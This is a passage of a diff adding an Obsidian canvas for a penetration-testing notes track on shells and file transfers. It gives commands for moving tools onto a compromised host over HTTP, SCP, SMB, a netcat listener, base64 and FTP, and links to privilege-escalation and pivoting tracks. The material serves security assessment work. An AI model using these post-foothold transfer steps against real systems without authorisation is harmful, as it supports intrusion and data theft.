+      "text": "### Establish Linux state and choose an escalation candidate\n\n**When:** A new Linux foothold or an identity/privilege change\n\n**Still required:** A working command channel and accurate effective identity, group, mount and process context\n\n[[tracks/07 Linux Privilege Escalation.canvas|Establish Linux state and choose an escalation candidate → 07 Linux Privilege Escalation]]",
+      "color": "5"
+    },
+    {
+      "id": "method:session-tty:next-2",
+      "type": "text",
+      "x": 3130,
+      "y": 12091,
+      "width": 620,
+      "height": 252,
+      "text": "### Use SSH passwords, keys and forwarding-capable access\n\n**When:** An SSH service and a known password, private key or agent context\n\n**Still required:** Compatible authentication method, correct user, accepted key policy and the requested shell/subsystem permission\n\n[[tracks/02 Services.canvas|Use SSH passwords, keys and forwarding-capable access → 02 Services]]",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-http:start",
+      "type": "text",
+      "x": 70,
+      "y": 12698,
+      "width": 350,
+      "height": 250,
+      "text": "## Transfer over HTTP using Linux or Windows clients\n\nA tool/artifact must reach a target that can make an HTTP request",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-http:discover",
+      "type": "text",
+      "x": 570,
+      "y": 12658,
+      "width": 780,
+      "height": 228,
+      "text": "### Discover\n\n```text\ncommand -v curl wget\nls -ld /tmp\nip route get LHOST\n```"
+    },
+    {
+      "id": "method:transfer-http:interpret",
+      "type": "text",
+      "x": 1500,
+      "y": 12638,
+      "width": 580,
+      "height": 156,
+      "text": "### What the output establishes\n\nA downloader, destination and plausible outbound path enable an HTTP transfer candidate.",
+      "color": "6"
+    },
+    {
+      "id": "method:transfer-http:validate",
+      "type": "text",
+      "x": 1500,
+      "y": 12884,
+      "width": 580,
+      "height": 156,
+      "text": "### Missing prerequisite\n\nCheck actual server bind/directory, HTTP request/response and source/destination hashes.",
+      "color": "2"
+    },
+    {
+      "id": "method:transfer-http:checks",
+      "type": "text",
+      "x": 570,
+      "y": 12946,
+      "width": 780,
+      "height": 132,
+      "text": "### Validate the condition\n\n```bash\npython3 -m http.server 8000 --bind LHOST --directory /PATH/TO/FILES\n```"
+    },
+    {
+      "id": "method:transfer-http:enabled",
+      "type": "text",
+      "x": 2280,
+      "y": 12588,
+      "width": 620,
+      "height": 252,
+      "text": "### Condition confirmed\n\nThe requested file is retrieved and its bytes match: use the verified copy.\n\n**Verify:** Compare sha256sum on Linux or Get-FileHash -Algorithm SHA256 on Windows, and verify destination permissions.\n\n[[notes/sessions-transfers.md#transfer-http|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:transfer-http:ruledout",
+      "type": "text",
+      "x": 2280,
+      "y": 12905,
+      "width": 620,
+      "height": 132,
+      "text": "### Condition disproved here\n\nNo permitted target-to-server route exists: reject this HTTP pull direction.",
+      "color": "1"
+    },
+    {
+      "id": "method:transfer-http:unknown",
+      "type": "text",
+      "x": 2280,
+      "y": 13102,
+      "width": 620,
+      "height": 132,
+      "text": "### Evidence inconclusive\n\nA route without a logged request leaves bind/firewall/DNS unresolved.",
+      "color": "2"
+    },
+    {
+      "id": "method:transfer-http:action",
+      "type": "text",
+      "x": 3130,
+      "y": 12588,
+      "width": 900,
+      "height": 252,
+      "text": "### Procedure entry — full sequence in the note\n\n```bash\ncd /path/to/tools\npython3 -m http.server 8000 --bind 0.0.0.0\n```\n\n[[notes/sessions-transfers.md#transfer-http|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:transfer-http:next-0",
+      "type": "text",
+      "x": 3130,
+      "y": 12930,
+      "width": 620,
+      "height": 252,
+      "text": "### Match an artifact to its executable consumer and runtime\n\n**When:** A downloaded/generated artifact exists but does not run\n\n**Still required:** Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format\n\n[[tracks/11 Execution Troubleshooting.canvas|Match an artifact to its executable consumer and runtime → 11 Execution Troubleshooting]]",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-http:next-1",
+      "type": "text",
+      "x": 3130,
+      "y": 13237,
+      "width": 620,
+      "height": 276,
+      "text": "### Use enumeration tools to generate manually testable candidates\n\n**When:** A Linux foothold is available; run an early sweep for sudo rules, file capabilities, credentials and writable privileged paths\n\n**Still required:** Verified target UID and architecture, a working shell/runtime, a reviewed transferred tool and a writable report location\n\n[[tracks/07 Linux Privilege Escalation.canvas|Use enumeration tools to generate manually testable candidates → 07 Linux Privilege Escalation]]",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-http:next-2",
+      "type": "text",
+      "x": 3130,
+      "y": 13568,
+      "width": 620,
+      "height": 276,
+      "text": "### Turn automated Windows findings into manually verified candidates\n\n**When:** A Windows foothold is available; run winPEAS or a focused survey for service/task permissions, token privileges and credentials\n\n**Still required:** Verified current token and architecture, a compatible reviewed executable or allowed PowerShell runtime, and a writable report location\n\n[[tracks/08 Windows Privilege Escalation.canvas|Turn automated Windows findings into manually verified candidates → 08 Windows Privilege Escalation]]",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-http:next-3",
+      "type": "text",
+      "x": 3130,
+      "y": 13899,
+      "width": 620,
+      "height": 252,
+      "text": "### Move Windows files through an authenticated SMB share\n\n**When:** A Windows source can reach a temporary assessment-side SMB service\n\n**Still required:** Inbound SMB listener on the server, outbound TCP/445 from the client, compatible SMB version and explicit share credentials\n\n**Move Windows files through an authenticated SMB share — on this canvas**",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-http:next-4",
+      "type": "text",
+      "x": 3130,
+      "y": 14206,
+      "width": 620,
+      "height": 276,
+      "text": "### Stream a file over a direct TCP connection\n\n**When:** Only a raw TCP tool and a direct or forwarded connection are available\n\n**Still required:** Unambiguous sender/receiver direction, compatible Netcat listener syntax and a writable output file\n\n**Stream a file over a direct TCP connection — on this canvas**",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-http:next-5",
+      "type": "text",
+      "x": 3130,
+      "y": 14537,
+      "width": 620,
+      "height": 276,
+      "text": "### Move a small artifact through a text-only channel\n\n**When:** The existing command channel permits text but no convenient file-transfer connection\n\n**Still required:** Available Base64 encode/decode, adequate command length and a writable destination\n\n**Move a small artifact through a text-only channel — on this canvas**",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-http:next-6",
+      "type": "text",
+      "x": 3130,
+      "y": 14868,
+      "width": 620,
+      "height": 276,
+      "text": "### Use a temporary FTP transfer as a constrained fallback\n\n**When:** The target has an FTP client and simpler transfer routes are unavailable\n\n**Still required:** A deliberately selected temporary server, correct served directory, control/data paths and binary transfer mode\n\n**Use a temporary FTP transfer as a constrained fallback — on this canvas**",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-scp:start",
+      "type": "text",
+      "x": 70,
+      "y": 15499,
+      "width": 350,
+      "height": 250,
+      "text": "## Copy files through an authenticated SSH service\n\nAn SSH identity can access the needed source/destination",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-scp:discover",
+      "type": "text",
+      "x": 570,
+      "y": 15459,
+      "width": 780,
+      "height": 180,
+      "text": "### Discover\n\n```text\nssh -v -p PORT USER@TARGET\n```"
+    },
+    {
+      "id": "method:transfer-scp:interpret",
+      "type": "text",
+      "x": 1500,
+      "y": 15439,
+      "width": 580,
+      "height": 156,
+      "text": "### What the output establishes\n\nSSH authentication gives a candidate transport; it does not prove SFTP/subsystem support or destination write.",
+      "color": "6"
+    },
+    {
+      "id": "method:transfer-scp:validate",
+      "type": "text",
+      "x": 1500,
+      "y": 15685,
+      "width": 580,
+      "height": 156,
+      "text": "### Missing prerequisite\n\nValidate client/server subsystem compatibility, source read and destination write; inspect resulting bytes.",
+      "color": "2"
+    },
+    {
+      "id": "method:transfer-scp:checks",
+      "type": "text",
+      "x": 570,
+      "y": 15699,
+      "width": 780,
+      "height": 132,
+      "text": "### Validate the condition\n\n```bash\nssh -p PORT -i KEY USER@TARGET\n```"
+    },
+    {
+      "id": "method:transfer-scp:enabled",
+      "type": "text",
+      "x": 2280,
+      "y": 15389,
+      "width": 620,
+      "height": 252,
+      "text": "### Condition confirmed\n\nThe supported copy mode writes the intended file and hashes match: use SCP.\n\n**Verify:** Verify copied bytes and location; uppercase -P selects scp's SSH port.\n\n[[notes/sessions-transfers.md#transfer-scp|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:transfer-scp:ruledout",
+      "type": "text",
+      "x": 2280,
+      "y": 15706,
+      "width": 620,
+      "height": 156,
+      "text": "### Condition disproved here\n\nThe destination is unwritable: reject that path while retaining SCP to a permitted directory.",
+      "color": "1"
+    },
+    {
+      "id": "method:transfer-scp:unknown",
+      "type": "text",
+      "x": 2280,
+      "y": 15927,
+      "width": 620,
+      "height": 132,
+      "text": "### Evidence inconclusive\n\nAccepted SSH without subsystem evidence leaves transfer behavior unknown.",
+      "color": "2"
+    },
+    {
+      "id": "method:transfer-scp:action",
+      "type": "text",
+      "x": 3130,
+      "y": 15389,
+      "width": 900,
+      "height": 228,
+      "text": "### Procedure entry — full sequence in the note\n\n```bash\nscp FILE USER@TARGET:/tmp/FILE\n```\n\n[[notes/sessions-transfers.md#transfer-scp|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:transfer-scp:next-0",
+      "type": "text",
+      "x": 3130,
+      "y": 15707,
+      "width": 620,
+      "height": 252,
+      "text": "### Match an artifact to its executable consumer and runtime\n\n**When:** A downloaded/generated artifact exists but does not run\n\n**Still required:** Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format\n\n[[tracks/11 Execution Troubleshooting.canvas|Match an artifact to its executable consumer and runtime → 11 Execution Troubleshooting]]",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-scp:next-1",
+      "type": "text",
+      "x": 3130,
+      "y": 16014,
+      "width": 620,
+      "height": 252,
+      "text": "### Transfer over HTTP using Linux or Windows clients\n\n**When:** A tool/artifact must reach a target that can make an HTTP request\n\n**Still required:** Correct server bind and served directory; target-to-server route, available downloader and writable destination\n\n**Transfer over HTTP using Linux or Windows clients — on this canvas**",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-scp:next-2",
+      "type": "text",
+      "x": 3130,
+      "y": 16321,
+      "width": 620,
+      "height": 252,
+      "text": "### Use SSH passwords, keys and forwarding-capable access\n\n**When:** An SSH service and a known password, private key or agent context\n\n**Still required:** Compatible authentication method, correct user, accepted key policy and the requested shell/subsystem permission\n\n[[tracks/02 Services.canvas|Use SSH passwords, keys and forwarding-capable access → 02 Services]]",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-smb:start",
+      "type": "text",
+      "x": 70,
+      "y": 16928,
+      "width": 350,
+      "height": 250,
+      "text": "## Move Windows files through an authenticated SMB share\n\nA Windows source can reach a temporary assessment-side SMB service",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-smb:discover",
+      "type": "text",
+      "x": 570,
+      "y": 16888,
+      "width": 780,
+      "height": 204,
+      "text": "### Discover\n\n```text\nTest-NetConnection LHOST -Port 445\nnet use\n```"
+    },
+    {
+      "id": "method:transfer-smb:interpret",
+      "type": "text",
+      "x": 1500,
+      "y": 16868,
+      "width": 580,
+      "height": 156,
+      "text": "### What the output establishes\n\nThe service is reachable, but an existing connection can constrain a different credential context.",
+      "color": "6"
+    },
+    {
+      "id": "method:transfer-smb:validate",
+      "type": "text",
+      "x": 1500,
+      "y": 17114,
+      "width": 580,
+      "height": 156,
+      "text": "### Missing prerequisite\n\nVerify intended share/server credentials, conflicting mappings, read/write rights and destination hash.",
+      "color": "2"
+    },
+    {
+      "id": "method:transfer-smb:checks",
+      "type": "text",
+      "x": 570,
+      "y": 17152,
+      "width": 780,
+      "height": 132,
+      "text": "### Validate the condition\n\n```powershell\nTest-NetConnection LHOST -Port 445\n```"
+    },
+    {
+      "id": "method:transfer-smb:enabled",
+      "type": "text",
+      "x": 2280,
+      "y": 16818,
+      "width": 620,
+      "height": 276,
+      "text": "### Condition confirmed\n\nThe intended authenticated share action succeeds and bytes match: use this transfer route.\n\n**Verify:** Verify source/destination hash and the share path; disconnect created mappings after use.\n\n[[notes/sessions-transfers.md#transfer-smb|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:transfer-smb:ruledout",
+      "type": "text",
+      "x": 2280,
+      "y": 17159,
+      "width": 620,
+      "height": 156,
+      "text": "### Condition disproved here\n\nOutbound SMB is blocked from this source: reject this direction, choosing another transport.",
+      "color": "1"
+    },
+    {
+      "id": "method:transfer-smb:unknown",
+      "type": "text",
+      "x": 2280,
+      "y": 17380,
+      "width": 620,
+      "height": 132,
+      "text": "### Evidence inconclusive\n\nTransport alone does not settle cached-session identity or object rights.",
+      "color": "2"
+    },
+    {
+      "id": "method:transfer-smb:action",
+      "type": "text",
+      "x": 3130,
+      "y": 16818,
+      "width": 900,
+      "height": 252,
+      "text": "### Procedure entry — full sequence in the note\n\n```bash\nmkdir -p share\nsudo impacket-smbserver transfer \"$(pwd)/share\" -smb2support -username USER -password 'PASSWORD'\n```\n\n[[notes/sessions-transfers.md#transfer-smb|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:transfer-smb:next-0",
+      "type": "text",
+      "x": 3130,
+      "y": 17160,
+      "width": 620,
+      "height": 252,
+      "text": "### Match an artifact to its executable consumer and runtime\n\n**When:** A downloaded/generated artifact exists but does not run\n\n**Still required:** Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format\n\n[[tracks/11 Execution Troubleshooting.canvas|Match an artifact to its executable consumer and runtime → 11 Execution Troubleshooting]]",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-smb:next-1",
+      "type": "text",
+      "x": 3130,
+      "y": 17467,
+      "width": 620,
+      "height": 276,
+      "text": "### Turn automated Windows findings into manually verified candidates\n\n**When:** A Windows foothold is available; run winPEAS or a focused survey for service/task permissions, token privileges and credentials\n\n**Still required:** Verified current token and architecture, a compatible reviewed executable or allowed PowerShell runtime, and a writable report location\n\n[[tracks/08 Windows Privilege Escalation.canvas|Turn automated Windows findings into manually verified candidates → 08 Windows Privilege Escalation]]",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-smb:next-2",
+      "type": "text",
+      "x": 3130,
+      "y": 17798,
+      "width": 620,
+      "height": 252,
+      "text": "### Transfer over HTTP using Linux or Windows clients\n\n**When:** A tool/artifact must reach a target that can make an HTTP request\n\n**Still required:** Correct server bind and served directory; target-to-server route, available downloader and writable destination\n\n**Transfer over HTTP using Linux or Windows clients — on this canvas**",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-stream:start",
+      "type": "text",
+      "x": 70,
+      "y": 18405,
+      "width": 350,
+      "height": 250,
+      "text": "## Stream a file over a direct TCP connection\n\nOnly a raw TCP tool and a direct or forwarded connection are available",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-stream:discover",
+      "type": "text",
+      "x": 570,
+      "y": 18365,
+      "width": 780,
+      "height": 204,
+      "text": "### Discover\n\n```text\nnc -h\nls -ld /DESTINATION_DIRECTORY\n```"
+    },
+    {
+      "id": "method:transfer-stream:interpret",
+      "type": "text",
+      "x": 1500,
+      "y": 18345,
+      "width": 580,
+      "height": 156,
+      "text": "### What the output establishes\n\nA raw stream may move bytes only if roles and connection direction are correct; no integrity metadata is supplied.",
+      "color": "6"
+    },
+    {
+      "id": "method:transfer-stream:validate",
+      "type": "text",
+      "x": 1500,
+      "y": 18591,
+      "width": 580,
+      "height": 156,
+      "text": "### Missing prerequisite\n\nConfirm listener syntax, reachability, binary-clean I/O and a complete independent hash match.",
+      "color": "2"
+    },
+    {
+      "id": "method:transfer-stream:checks",
+      "type": "text",
+      "x": 570,
+      "y": 18629,
+      "width": 780,
+      "height": 156,
+      "text": "### Validate the condition\n\n```bash\nnc -h\nip route get TARGET\n```"
+    },
+    {
+      "id": "method:transfer-stream:enabled",
+      "type": "text",
+      "x": 2280,
+      "y": 18295,
+      "width": 620,
+      "height": 252,
+      "text": "### Condition confirmed\n\nThe chosen stream finishes with matching bytes: use the saved artifact.\n\n**Verify:** Compare hashes and avoid mixing diagnostic text into the file stream.\n\n[[notes/sessions-transfers.md#transfer-stream|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:transfer-stream:ruledout",
+      "type": "text",
+      "x": 2280,
+      "y": 18612,
+      "width": 620,
+      "height": 156,
+      "text": "### Condition disproved here\n\nThe only available direction cannot reach the receiver: reject this stream route.",
+      "color": "1"
+    },
+    {
+      "id": "method:transfer-stream:unknown",
+      "type": "text",
+      "x": 2280,
+      "y": 18833,
+      "width": 620,
+      "height": 156,
+      "text": "### Evidence inconclusive\n\nA connection with unknown termination/file size leaves transfer completeness unresolved.",
+      "color": "2"
+    },
+    {
+      "id": "method:transfer-stream:action",
+      "type": "text",
+      "x": 3130,
+      "y": 18295,
+      "width": 900,
+      "height": 228,
+      "text": "### Procedure entry — full sequence in the note\n\n```bash\nnc -lvnp PORT > FILE\n```\n\n[[notes/sessions-transfers.md#transfer-stream|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:transfer-stream:next-0",
+      "type": "text",
+      "x": 3130,
+      "y": 18613,
+      "width": 620,
+      "height": 252,
+      "text": "### Match an artifact to its executable consumer and runtime\n\n**When:** A downloaded/generated artifact exists but does not run\n\n**Still required:** Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format\n\n[[tracks/11 Execution Troubleshooting.canvas|Match an artifact to its executable consumer and runtime → 11 Execution Troubleshooting]]",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-stream:next-1",
+      "type": "text",
+      "x": 3130,
+      "y": 18920,
+      "width": 620,
+      "height": 252,
+      "text": "### Transfer over HTTP using Linux or Windows clients\n\n**When:** A tool/artifact must reach a target that can make an HTTP request\n\n**Still required:** Correct server bind and served directory; target-to-server route, available downloader and writable destination\n\n**Transfer over HTTP using Linux or Windows clients — on this canvas**",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-stream:next-2",
+      "type": "text",
+      "x": 3130,
+      "y": 19227,
+      "width": 620,
+      "height": 252,
+      "text": "### Relay a single TCP service through a fixed forward\n\n**When:** One reachable pivot can connect to one internal TCP destination\n\n**Still required:** A bindable pivot listener, source-to-listener access and pivot-to-destination connectivity\n\n[[tracks/10 Pivoting.canvas|Relay a single TCP service through a fixed forward → 10 Pivoting]]",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-text:start",
+      "type": "text",
+      "x": 70,
+      "y": 19834,
+      "width": 350,
+      "height": 250,
+      "text": "## Move a small artifact through a text-only channel\n\nThe existing command channel permits text but no convenient file-transfer connection",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-text:discover",
+      "type": "text",
+      "x": 570,
+      "y": 19794,
+      "width": 780,
+      "height": 204,
+      "text": "### Discover\n\n```text\ncommand -v base64\nwc -c FILE\n```"
+    },
+    {
+      "id": "method:transfer-text:interpret",
+      "type": "text",
+      "x": 1500,
+      "y": 19774,
+      "width": 580,
+      "height": 156,
+      "text": "### What the output establishes\n\nA small artifact and compatible decoder make text transport plausible, without assuming large encoded commands survive.",
+      "color": "6"
+    },
+    {
+      "id": "method:transfer-text:validate",
+      "type": "text",
+      "x": 1500,
+      "y": 20020,
+      "width": 580,
+      "height": 156,
+      "text": "### Missing prerequisite\n\nVerify exact length/quoting and source/destination hash; use the Windows decoding variant when appropriate.",
+      "color": "2"
+    },
+    {
+      "id": "method:transfer-text:checks",
+      "type": "text",
+      "x": 570,
+      "y": 20058,
+      "width": 780,
+      "height": 156,
+      "text": "### Validate the condition\n\n```bash\nbase64 -w 0 FILE\nsha256sum FILE\n```"
+    },
+    {
+      "id": "method:transfer-text:enabled",
+      "type": "text",
+      "x": 2280,
+      "y": 19724,
+      "width": 620,
+      "height": 252,
+      "text": "### Condition confirmed\n\nThe complete decoded bytes match: use the text-transfer result.\n\n**Verify:** Require a complete matching hash; keep encoded secrets in private evidence rather than reusable notes.\n\n[[notes/sessions-transfers.md#transfer-text|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:transfer-text:ruledout",
+      "type": "text",
+      "x": 2280,
+      "y": 20041,
+      "width": 620,
+      "height": 156,
+      "text": "### Condition disproved here\n\nThe channel truncates below the required encoded size: reject a one-command transfer of this artifact.",
+      "color": "1"
+    },
+    {
+      "id": "method:transfer-text:unknown",
+      "type": "text",
+      "x": 2280,
+      "y": 20262,
+      "width": 620,
+      "height": 156,
+      "text": "### Evidence inconclusive\n\nUnknown command limits require a harmless small round trip before relying on the channel.",
+      "color": "2"
+    },
+    {
+      "id": "method:transfer-text:action",
+      "type": "text",
+      "x": 3130,
+      "y": 19724,
+      "width": 900,
+      "height": 228,
+      "text": "### Procedure entry — full sequence in the note\n\n```bash\nbase64 -w 0 FILE\n```\n\n[[notes/sessions-transfers.md#transfer-text|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:transfer-text:next-0",
+      "type": "text",
+      "x": 3130,
+      "y": 20042,
+      "width": 620,
+      "height": 252,
+      "text": "### Repair quoting, encoding and command-length boundaries\n\n**When:** A simple command works while a longer or nested payload fails\n\n**Still required:** Known outer request/template/database parser and inner shell; correct character encoding and transport length\n\n[[tracks/11 Execution Troubleshooting.canvas|Repair quoting, encoding and command-length boundaries → 11 Execution Troubleshooting]]",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-text:next-1",
+      "type": "text",
+      "x": 3130,
+      "y": 20349,
+      "width": 620,
+      "height": 252,
+      "text": "### Transfer over HTTP using Linux or Windows clients\n\n**When:** A tool/artifact must reach a target that can make an HTTP request\n\n**Still required:** Correct server bind and served directory; target-to-server route, available downloader and writable destination\n\n**Transfer over HTTP using Linux or Windows clients — on this canvas**",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-text:next-2",
+      "type": "text",
+      "x": 3130,
+      "y": 20656,
+      "width": 620,
+      "height": 276,
+      "text": "### Classify the artifact and its identity context\n\n**When:** A secret-like value, key file, stored hash, challenge response or ticket\n\n**Still required:** Artifact provenance and format; possible local/domain/application identity and compatible protocol\n\n[[tracks/05 Credentials.canvas|Classify the artifact and its identity context → 05 Credentials]]",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-ftp:start",
+      "type": "text",
+      "x": 70,
+      "y": 21287,
+      "width": 350,
+      "height": 250,
+      "text": "## Use a temporary FTP transfer as a constrained fallback\n\nThe target has an FTP client and simpler transfer routes are unavailable",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-ftp:discover",
+      "type": "text",
+      "x": 570,
+      "y": 21247,
+      "width": 780,
+      "height": 228,
+      "text": "### Discover\n\n```text\nftp\nhelp\nquit\n```"
+    },
+    {
+      "id": "method:transfer-ftp:interpret",
+      "type": "text",
+      "x": 1500,
+      "y": 21227,
+      "width": 580,
+      "height": 156,
+      "text": "### What the output establishes\n\nClient availability permits investigating FTP; binary mode and separate data-channel paths remain necessary.",
+      "color": "6"
+    },
+    {
+      "id": "method:transfer-ftp:validate",
+      "type": "text",
+      "x": 1500,
+      "y": 21473,
+      "width": 580,
+      "height": 156,
+      "text": "### Missing prerequisite\n\nVerify deliberate server scope, control/data connectivity, required read/write and post-transfer hashes.",
+      "color": "2"
+    },
+    {
+      "id": "method:transfer-ftp:checks",
+      "type": "text",
+      "x": 570,
+      "y": 21535,
+      "width": 780,
+      "height": 156,
+      "text": "### Validate the condition\n\n```text\nftp LHOST PORT\nbinary\n```"
+    },
+    {
+      "id": "method:transfer-ftp:enabled",
+      "type": "text",
+      "x": 2280,
+      "y": 21177,
+      "width": 620,
+      "height": 252,
+      "text": "### Condition confirmed\n\nBinary transfer completes and hashes match: use that verified temporary copy.\n\n**Verify:** Compare bytes and stop the temporary server after its purpose is complete.\n\n[[notes/sessions-transfers.md#transfer-ftp|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:transfer-ftp:ruledout",
+      "type": "text",
+      "x": 2280,
+      "y": 21494,
+      "width": 620,
+      "height": 156,
+      "text": "### Condition disproved here\n\nOnly the control channel works and the required data route is blocked: reject this FTP path.",
+      "color": "1"
+    },
+    {
+      "id": "method:transfer-ftp:unknown",
+      "type": "text",
+      "x": 2280,
+      "y": 21715,
+      "width": 620,
+      "height": 132,
+      "text": "### Evidence inconclusive\n\nClient presence alone leaves data transport and server rights unproved.",
+      "color": "2"
+    },
+    {
+      "id": "method:transfer-ftp:action",
+      "type": "text",
+      "x": 3130,
+      "y": 21177,
+      "width": 900,
+      "height": 228,
+      "text": "### Procedure entry — full sequence in the note\n\n```bash\npython3 -m pyftpdlib -p PORT\n```\n\n[[notes/sessions-transfers.md#transfer-ftp|Full note & variants]]",
+      "color": "4"
+    },
+    {
+      "id": "method:transfer-ftp:next-0",
+      "type": "text",
+      "x": 3130,
+      "y": 21495,
+      "width": 620,
+      "height": 252,
+      "text": "### Match an artifact to its executable consumer and runtime\n\n**When:** A downloaded/generated artifact exists but does not run\n\n**Still required:** Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format\n\n[[tracks/11 Execution Troubleshooting.canvas|Match an artifact to its executable consumer and runtime → 11 Execution Troubleshooting]]",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-ftp:next-1",
+      "type": "text",
+      "x": 3130,
+      "y": 21802,
+      "width": 620,
+      "height": 252,
+      "text": "### Transfer over HTTP using Linux or Windows clients\n\n**When:** A tool/artifact must reach a target that can make an HTTP request\n\n**Still required:** Correct server bind and served directory; target-to-server route, available downloader and writable destination\n\n**Transfer over HTTP using Linux or Windows clients — on this canvas**",
+      "color": "5"
+    },
+    {
+      "id": "method:transfer-ftp:next-2",
+      "type": "text",
+      "x": 3130,
+      "y": 22109,
+      "width": 620,
+      "height": 252,
+      "text": "### Copy files through an authenticated SSH service\n\n**When:** An SSH identity can access the needed source/destination\n\n**Still required:** Reachable SSH/SFTP service, correct key/password and read/write rights; client/server subsystem compatibility\n\n**Copy files through an authenticated SSH service — on this canvas**",
+      "color": "5"
+    },
+    {
+      "id": "track-title",
+      "type": "text",
+      "x": 0,
+      "y": 0,
+      "width": 2300,
+      "height": 270,
+      "color": "5",
+      "text": "# 06 Shells and Transfers\n\nAll workflows, commands, result interpretations and method connections for this track are on this canvas. Embedded notes contain the complete procedures and variants.\n\n[[START.canvas|Choose another track]]\n\nCross-track results link directly to the receiving track."
+    }
+  ],
+  "edges": [
+    {
+      "id": "flow:sessions-transfers:check-0--check-0-finding-0",
+      "fromNode": "flow:sessions-transfers:check-0",
+      "fromSide": "right",
+      "toNode": "flow:sessions-transfers:check-0-finding-0",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Commands execute as the expected target identity"
+    },
+    {
+      "id": "flow:sessions-transfers:check-0--check-0-finding-1",
+      "fromNode": "flow:sessions-transfers:check-0",
+      "fromSide": "right",
+      "toNode": "flow:sessions-transfers:check-0-finding-1",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Callback cannot reach the listener"
+    },
+    {
+      "id": "flow:sessions-transfers:check-0--check-0-fallback",
+      "fromNode": "flow:sessions-transfers:check-0",
+      "fromSide": "right",
+      "toNode": "flow:sessions-transfers:check-0-fallback",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Output cannot be attributed to the destination: repeat the host/identity proof."
+    },
+    {
+      "id": "flow:sessions-transfers:check-0--check-1",
+      "fromNode": "flow:sessions-transfers:check-0",
+      "fromSide": "bottom",
+      "toNode": "flow:sessions-transfers:check-1",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "continue coverage"
+    },
+    {
+      "id": "flow:sessions-transfers:check-1--check-1-finding-0",
+      "fromNode": "flow:sessions-transfers:check-1",
+      "fromSide": "right",
+      "toNode": "flow:sessions-transfers:check-1-finding-0",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "The verified Linux enumerator is present"
+    },
+    {
+      "id": "flow:sessions-transfers:check-1--check-1-finding-1",
+      "fromNode": "flow:sessions-transfers:check-1",
+      "fromSide": "right",
+      "toNode": "flow:sessions-transfers:check-1-finding-1",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "HTTP is unavailable but SSH file access works"
+    },
+    {
+      "id": "flow:sessions-transfers:check-1--check-1-finding-2",
+      "fromNode": "flow:sessions-transfers:check-1",
+      "fromSide": "right",
+      "toNode": "flow:sessions-transfers:check-1-finding-2",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "SMB is the usable authenticated channel"
+    },
+    {
+      "id": "flow:sessions-transfers:check-1--check-1-fallback",
+      "fromNode": "flow:sessions-transfers:check-1",
+      "fromSide": "right",
+      "toNode": "flow:sessions-transfers:check-1-fallback",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Bytes differ or the file is missing: fix transfer before interpreting execution errors."
+    },
+    {
+      "id": "flow:sessions-transfers:home--check-0",
+      "fromNode": "flow:sessions-transfers:home",
+      "fromSide": "right",
+      "toNode": "flow:sessions-transfers:check-0",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "start with current access"
+    },
+    {
+      "id": "method:session-proof:start--discover",
+      "fromNode": "method:session-proof:start",
+      "fromSide": "right",
+      "toNode": "method:session-proof:discover",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "inspect this surface"
+    },
+    {
+      "id": "method:session-proof:discover--interpret",
+      "fromNode": "method:session-proof:discover",
+      "fromSide": "right",
+      "toNode": "method:session-proof:interpret",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "interpret the evidence"
+    },
+    {
+      "id": "method:session-proof:interpret--validate",
+      "fromNode": "method:session-proof:interpret",
+      "fromSide": "bottom",
+      "toNode": "method:session-proof:validate",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "still check"
+    },
+    {
+      "id": "method:session-proof:validate--checks",
+      "fromNode": "method:session-proof:validate",
+      "fromSide": "left",
